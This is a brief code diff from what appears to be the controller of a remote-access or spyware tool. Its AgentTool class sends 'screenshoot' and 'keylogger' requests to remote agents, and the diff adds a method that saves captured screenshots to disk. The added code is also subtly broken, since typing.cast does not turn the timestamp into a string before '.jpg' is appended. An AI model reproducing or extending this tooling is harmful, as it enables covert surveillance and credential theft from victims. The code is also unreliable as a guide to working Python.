@@ -6,7 +6,7 @@ from logger import get_logger
 from Crypto.Cipher import PKCS1_OAEP
 import msgpack
 from typing import cast
-
+from datetime import datetime
 from globals import AGENTS_JSON, ENCODING, RECV_SIZE, TLS_ENABLED
 
 logger = get_logger()
@@ -81,6 +81,13 @@ class AgentTool:
         request = {"type": "screenshoot"}
         msg = self.generate_msgpack_from_dict(request)
         self.send_bytes(agent=agent, data=msg)
+
+    def handle_screenshoot(self, data: bytes) -> str:
+        """Gets bytes data and write into image file"""
+        filename = cast(str, datetime.now().timestamp()) + ".jpg"
+        with open(filename, "wb") as f:
+            f.write(data)
+        return filename
 
     def request_keystrokes(self, agent: Agent) -> None:
         request = {"type": "keylogger"}
